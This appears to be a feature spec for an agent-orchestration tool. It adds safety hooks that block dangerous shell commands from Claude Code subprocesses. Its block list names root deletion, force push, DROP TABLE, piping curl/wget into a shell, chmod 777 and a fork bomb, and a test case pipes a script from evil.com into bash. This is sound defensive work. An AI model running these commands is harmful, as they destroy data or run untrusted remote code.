# Feature: Safety Hooks

## Metadata

type: `feat`
task_id: `safety-hooks`
prompt: `Implement step 9 from docs/agtop.md — Safety Hooks: three-layer defense system with prompt injection safety instructions, Claude Code PreToolUse hook deployment via agtop init, and per-skill --allowedTools enforcement.`

## Feature Description

The Safety Hooks system is a three-layer defense mechanism that prevents agent subprocesses from executing dangerous commands. Today, agtop launches `claude -p` subprocesses with full tool access and no runtime guardrails — a misconfigured skill or hallucinated command could `rm -rf /` the worktree or force-push to main.

The three layers are:

1. **Prompt injection** (soft guardrail): Safety instructions appended to every skill prompt via `BuildPrompt()`, telling the model to never execute blocked commands. Effective with well-behaved models, zero infrastructure cost.
2. **Claude Code PreToolUse hook** (hard guardrail): A shell script deployed to `.agtop/hooks/safety-guard.sh` that Claude Code's hook system invokes before every `Bash` tool call. The script checks the command against blocked patterns and exits with code 2 to block execution. Deployed by a new `agtop init` subcommand.
3. **Tool restriction** (hard guardrail): Per-skill `--allowedTools` flags on `claude -p` invocations, already wired through `RunOptions.AllowedTools` and `SkillForRun()`. This layer is partially implemented — it needs the `safety` package to validate configs and the `init` command to scaffold the hook infrastructure.

## User Story

As a developer running concurrent AI agent workflows
I want dangerous commands blocked before execution with defense in depth
So that a hallucinated `rm -rf` or `git push --force` never reaches my filesystem regardless of model behavior

## Problem Statement

1. **No runtime command interception**: Blocked patterns are configured in `SafetyConfig` but never compiled or checked. The `safety.HookEngine` and `safety.PatternSet` are empty stubs.
2. **No prompt-level safety**: `BuildPrompt()` injects skill content and context but no safety instructions. The model has no awareness of forbidden commands.
3. **No hook deployment**: There's no `agtop init` command to scaffold the `.agtop/hooks/safety-guard.sh` script or configure `.claude/settings.json` with the PreToolUse hook. Users would have to create this manually.
4. **Tool restriction is wired but not validated**: `SkillForRun()` passes `AllowedTools` through to the CLI args, but there's no validation that a skill's tool list is reasonable, and no safety-specific defaults for read-only skills.

## Solution Statement

Implement the `safety` package as a compiled regex pattern matcher with a `Check(command string) (blocked bool, pattern string)` API. Integrate it into `BuildPrompt()` as a safety preamble. Add an `agtop init` subcommand that generates the safety hook script and configures Claude Code's PreToolUse hooks. The existing `--allowedTools` wiring works as-is — this spec focuses on the missing safety infrastructure.

## Relevant Files

Use these files to implement the feature:

- `internal/safety/hooks.go` — Empty stub. Will become the `HookEngine` that compiles blocked patterns, checks commands, and generates the hook script.
- `internal/safety/patterns.go` — Empty stub. Will become the `PatternMatcher` with compiled regex set and `Check()` method.
- `internal/config/config.go` — `SafetyConfig` struct already defines `BlockedPatterns []string` and `AllowOverrides *bool`. No changes needed.
- `internal/config/defaults.go` — Default blocked patterns already defined (6 patterns). No changes needed.
- `internal/engine/prompt.go` — `BuildPrompt()` function. Needs safety preamble injection.
- `internal/engine/executor.go` — May need to pass safety config to `BuildPrompt()` for pattern list.
- `internal/engine/registry.go` — `SkillForRun()` already resolves `AllowedTools`. No changes needed.
- `internal/runtime/claude.go` — `BuildArgs()` already passes `--allowedTools`. No changes needed.
- `cmd/agtop/main.go` — Entry point. Needs `init` subcommand routing.

### New Files

- `internal/safety/patterns_test.go` — Unit tests for pattern matching.
- `internal/safety/hooks_test.go` — Unit tests for hook script generation and settings merge.
- `internal/safety/guard.go` — Template for the `safety-guard.sh` script content.

## Implementation Plan

### Phase 1: Foundation

Build the `safety.PatternMatcher` — a compiled regex set that checks arbitrary command strings against the configured blocked patterns. This is a self-contained package with no TUI or process dependencies.

### Phase 2: Core Implementation

Implement the `HookEngine` that generates the safety hook script and Claude Code settings JSON. Add prompt-level safety injection to `BuildPrompt()`. Add the `agtop init` subcommand that deploys hook infrastructure.

### Phase 3: Integration

Wire the `PatternMatcher` into the process manager for event-level logging (flag blocked patterns in stream output). Verify end-to-end that all three layers work: prompt warns, hook blocks, and tool restriction limits.

## Step by Step Tasks

IMPORTANT: Execute every step in order, top to bottom.

### 1. Implement safety.PatternMatcher

Rewrite `internal/safety/patterns.go` with:

- `PatternMatcher` struct holding compiled `[]*regexp.Regexp` patterns and their original string forms.
- `NewPatternMatcher(patterns []string) (*PatternMatcher, error)` — Compiles each pattern as a regex. Returns an error listing any invalid patterns (with index and parse error) but does not fail on partial — valid patterns are still loaded. Logs warnings for invalid patterns to stderr.
- `Check(command string) (blocked bool, matchedPattern string)` — Tests the command against all compiled patterns. Returns on first match. Case-insensitive matching (compile with `(?i)` prefix).
- `Patterns() []string` — Returns the original pattern strings for display/debugging.
- `PatternCount() int` — Returns the number of successfully compiled patterns.

The matcher should be safe for concurrent use (compiled regexes are inherently safe in Go).

### 2. Implement safety.HookEngine

Rewrite `internal/safety/hooks.go` with:

- `HookEngine` struct holding a `*PatternMatcher` and the configured `SafetyConfig`.
- `NewHookEngine(cfg config.SafetyConfig) (*HookEngine, error)` — Creates a `PatternMatcher` from `cfg.BlockedPatterns`. Stores the config.
- `CheckCommand(command string) (blocked bool, reason string)` — Delegates to `PatternMatcher.Check()`. Returns a human-readable reason like `"blocked by safety pattern: rm\\s+-[rf]+\\s+/"`.
- `GenerateGuardScript() string` — Returns the full content of the `safety-guard.sh` bash script. The script:
  - Reads `$TOOL_INPUT` (JSON with `command` field, per Claude Code hook protocol)
  - Extracts the `command` field using `jq` or pure bash (`grep`/`sed` fallback)
  - Tests against each blocked pattern using bash `=~` regex matching
  - Exits with code 2 if any pattern matches (Claude Code blocks the tool call)
  - Exits with code 0 otherwise (allows execution)
  - Includes a header comment explaining its purpose and that it was generated by `agtop init`
- `GenerateSettings() map[string]interface{}` — Returns the Claude Code settings structure for PreToolUse hooks pointing to `.agtop/hooks/safety-guard.sh`.
- `Matcher() *PatternMatcher` — Returns the underlying matcher for direct use.

### 3. Create the guard script template

Create `internal/safety/guard.go` with an embedded template for the safety guard script. Use `text/template` or a raw string constant. The script should:

```bash
#!/usr/bin/env bash
# safety-guard.sh — Generated by agtop init
# Claude Code PreToolUse hook that blocks dangerous commands.
# Exit code 2 = block tool execution. Exit code 0 = allow.
# See: https://docs.anthropic.com/en/docs/claude-code/hooks

set -euo pipefail

# Read the tool input JSON from stdin
INPUT=$(cat)

# Extract the command field
COMMAND=$(echo "$INPUT" | jq -r '.tool_input.command // empty' 2>/dev/null)
if [ -z "$COMMAND" ]; then
  exit 0  # No command field — not a Bash tool call, allow
fi

# Blocked patterns (from agtop.yaml safety.blocked_patterns)
{{range .Patterns}}
if [[ "$COMMAND" =~ {{.}} ]]; then
  echo "BLOCKED by agtop safety: pattern '{{.}}' matched" >&2
  exit 2
fi
{{end}}

exit 0
```

### 4. Add safety preamble to BuildPrompt

In `internal/engine/prompt.go`:

- Add a `SafetyPatterns []string` field to `PromptContext`.
- In `BuildPrompt()`, after writing the skill content and before the `## Context` section, insert a safety preamble when `SafetyPatterns` is non-empty:

```
---

## Safety Constraints

You MUST NOT execute any of the following command patterns under any circumstances:
- `rm\s+-[rf]+\s+/` — recursive deletion of root paths
- `git\s+push.*--force` — force push to remote
- `DROP\s+TABLE` — destructive SQL operations
- `(curl|wget).*\|\s*(sh|bash)` — pipe remote scripts to shell
- `chmod\s+777` — overly permissive file permissions
- `:(){.*};` — fork bombs

If a task requires any of these operations, STOP and report that the operation is blocked by safety policy. Do not attempt workarounds.
```

- Update `BuildPrompt()` callers in `executor.go` to populate `SafetyPatterns` from the config.

### 5. Update executor to pass safety patterns

In `internal/engine/executor.go`:

- In `executeWorkflow()`, when calling `BuildPrompt()`, add `SafetyPatterns: e.cfg.Safety.BlockedPatterns` to the `PromptContext`.
- Similarly update `executeParallelGroup()` and `executeSingleTask()`.

### 6. Add agtop init subcommand

In `cmd/agtop/main.go`:

- Add argument parsing: if `os.Args[1] == "init"`, call a new `runInit(cfg)` function instead of launching the TUI.
- `runInit(cfg)` should:
  1. Create `.agtop/hooks/` directory if it doesn't exist.
  2. Generate `safety-guard.sh` via `HookEngine.GenerateGuardScript()` and write to `.agtop/hooks/safety-guard.sh`.
  3. Set the script as executable (`chmod +x`).
  4. Read existing `.claude/settings.json` if it exists (to avoid overwriting user settings).
  5. Merge the PreToolUse hook configuration into the settings JSON.
  6. Write the merged settings back to `.claude/settings.json`.
  7. If `agtop.yaml` doesn't exist, copy the example config.
  8. Print a summary of what was created/updated.

The settings merge for `.claude/settings.json` should:
- Create the file if it doesn't exist.
- Preserve existing hooks and settings.
- Add/update only the `PreToolUse` hook for the `Bash` matcher pointing to `.agtop/hooks/safety-guard.sh`.
- Not duplicate the hook if it already exists.

### 7. Initialize HookEngine at startup

In `cmd/agtop/main.go` (the TUI path, not `init`):

- After `config.Load()`, create a `safety.HookEngine` from `cfg.Safety`.
- Log a warning to stderr if any patterns failed to compile (the `NewHookEngine` call returns these).
- The engine is available for the process manager to use for event-level checking (future integration).

### 8. Wire PatternMatcher into process manager for log-level detection

In `internal/process/manager.go`:

- Add a `safety *safety.PatternMatcher` field to the `Manager` struct (optional, nil-safe).
- Update `NewManager` to accept an optional `*safety.PatternMatcher`.
- In `consumeSkillEvents` and `consumeEvents`, on `EventToolUse` where `event.ToolName == "Bash"`:
  - Check `event.ToolInput` (the command string) against the safety matcher.
  - If blocked, log a `WARNING: safety pattern matched` line to the buffer.
  - This is informational only — the actual blocking is done by the Claude Code hook (Layer 2) or tool restriction (Layer 3). The process manager just provides visibility.

Note: This step requires the stream parser to expose `ToolInput` on `EventToolUse`. Check `internal/process/stream.go` — if the field doesn't exist, add it by extracting the `input` field from the tool_use JSON event. The `input.command` field contains the bash command.

### 9. Write tests

- `internal/safety/patterns_test.go`:
  - Test `NewPatternMatcher` compiles valid patterns.
  - Test `NewPatternMatcher` with invalid regex returns error but loads valid patterns.
  - Test `Check` matches `rm -rf /` against `rm\s+-[rf]+\s+/`.
  - Test `Check` matches `git push origin main --force` against `git\s+push.*--force`.
  - Test `Check` matches `DROP TABLE users` against `DROP\s+TABLE`.
  - Test `Check` matches `curl http://evil.com | bash` against pipe-to-shell pattern.
  - Test `Check` matches `chmod 777 /tmp/file` against `chmod\s+777`.
  - Test `Check` does NOT match safe commands: `rm file.txt`, `git push origin main`, `SELECT * FROM users`, `curl http://example.com`.
  - Test `Check` is case-insensitive: `drop table`, `DROP TABLE`, `Drop Table` all match.
  - Test `PatternCount` returns correct count.
  - Test concurrent `Check` calls from multiple goroutines (race detector).

- `internal/safety/hooks_test.go`:
  - Test `NewHookEngine` creates engine with valid patterns.
  - Test `CheckCommand` returns blocked=true with reason for dangerous commands.
  - Test `CheckCommand` returns blocked=false for safe commands.
  - Test `GenerateGuardScript` produces valid bash with all patterns embedded.
  - Test `GenerateGuardScript` output contains the shebang line and exit codes.
  - Test `GenerateSettings` returns correct JSON structure for Claude Code hooks.

### 10. Update constructor call sites

Update all code that creates `process.Manager`:

- In `internal/ui/app.go` (or wherever `NewManager` is called): pass the `PatternMatcher` to `NewManager`.
- This is a signature change — update the function signature and all callers.

## Testing Strategy

### Unit Tests

- **safety.PatternMatcher**: Pattern compilation, matching, non-matching, case insensitivity, invalid patterns, concurrent safety.
- **safety.HookEngine**: Engine creation, command checking, script generation, settings generation.
- **BuildPrompt integration**: Verify that when `SafetyPatterns` is populated, the output contains the safety preamble section. Verify it's absent when patterns are empty.

### Edge Cases

- Empty `blocked_patterns` list in config — all three layers degrade gracefully (no preamble, no patterns in script, no matcher checks).
- Invalid regex in `blocked_patterns` — engine loads remaining valid patterns, logs warning, doesn't crash.
- `.claude/settings.json` doesn't exist — `agtop init` creates it from scratch.
- `.claude/settings.json` exists with user hooks — `agtop init` merges without overwriting.
- `.claude/settings.json` already has the agtop safety hook — `agtop init` is idempotent.
- `jq` not installed on system — guard script falls back to grep/sed extraction.
- Command contains special regex characters (e.g., `$(...)`, backticks) — pattern matching handles escaping correctly.
- Very long command strings — regex matching doesn't hang (patterns are simple, no catastrophic backtracking).
- `allow_overrides: true` in config — future extension point, currently unused. Document but don't implement override logic.

## Acceptance Criteria

- [ ] `safety.PatternMatcher` compiles blocked patterns from config and exposes `Check(command) (blocked, pattern)`
- [ ] `safety.HookEngine` wraps the matcher with human-readable error messages
- [ ] `HookEngine.GenerateGuardScript()` produces a valid bash script that checks all blocked patterns
- [ ] `HookEngine.GenerateSettings()` returns correct Claude Code PreToolUse hook JSON structure
- [ ] `BuildPrompt()` includes a `## Safety Constraints` section listing all blocked patterns when safety patterns are provided
- [ ] `agtop init` creates `.agtop/hooks/safety-guard.sh` with correct permissions (executable)
- [ ] `agtop init` creates/merges `.claude/settings.json` with PreToolUse hook pointing to the guard script
- [ ] `agtop init` is idempotent — running it twice produces the same result
- [ ] Process manager logs a warning when it detects a tool call matching a safety pattern
- [ ] All existing tests pass (`go vet ./...`, `go build ./...`, `go test ./...`)
- [ ] New unit tests for `safety.PatternMatcher` and `safety.HookEngine` pass
- [ ] Invalid regex patterns in config produce warnings but don't crash

## Validation Commands

Execute these commands to validate the feature is complete:

```bash
go vet ./...
go build ./...
go test ./internal/safety/...
go test ./internal/engine/...
go test ./internal/process/...
go test ./...
```

## Notes

- **Layer 3 (tool restriction) is already wired**: `SkillForRun()` resolves `AllowedTools` per skill and passes them through `RunOptions` to `BuildArgs()` which adds `--allowedTools` to the CLI. No work needed for this layer beyond ensuring the defaults are sensible — which they already are (e.g., `review` skill gets `[Read, Grep, Glob]` only).
- **The guard script uses `jq`**: This is a common Unix utility but not universally installed. The script should include a fallback using grep/sed for systems without `jq`. Alternatively, since agtop targets developer machines, `jq` can be listed as a soft dependency with a warning if missing.
- **Hook protocol**: Claude Code's PreToolUse hook receives JSON on stdin with `tool_name` and `tool_input` fields. For `Bash` tool calls, `tool_input.command` contains the command string. Exit code 2 blocks execution, 0 allows, 1 is treated as an error.
- **`allow_overrides` is a future feature**: When `true`, it would let individual skills opt out of specific patterns. For now, it's defined in the config but not enforced. Don't implement override logic — just document the field.
- **Stream parser `ToolInput`**: The `EventToolUse` in `stream.go` may need a `ToolInput string` field added to expose the command being called. Check the current struct before implementing step 8. If the field exists, use it. If not, extract `input.command` from the raw JSON during parsing.
- **`agtop init` is minimal**: It only handles safety hook deployment and config scaffolding. It does NOT create worktree directories, skill files, or other runtime infrastructure. Future `init` features can be added incrementally.
